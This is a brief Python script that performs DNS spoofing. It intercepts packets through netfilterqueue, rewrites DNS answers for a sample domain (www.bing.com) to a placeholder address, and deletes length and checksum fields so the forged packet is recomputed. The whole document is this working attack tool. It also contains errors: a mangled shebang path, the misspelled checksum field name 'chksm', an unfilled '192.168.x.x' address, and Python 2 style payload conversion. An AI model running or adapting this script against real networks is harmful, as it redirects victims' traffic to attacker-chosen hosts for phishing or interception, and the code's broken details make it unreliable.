#!/usrbin/evn python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    my_packet = scapy.IP(packet.get_payload())
    if my_packet.haslayer(scapy.DNSRR):
        qname = my_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:  # sample domain
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.x.x")  # sample ip address
            my_packet[scapy.DNS].an = answer
            my_packet[scapy.DNS].ancount = 1

            del my_packet[scapy.IP].len
            del my_packet[scapy.IP].chksm
            del my_packet[scapy.UDP].chksm
            del my_packet[scapy.UDP].len

            packet.set_payload(str(my_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
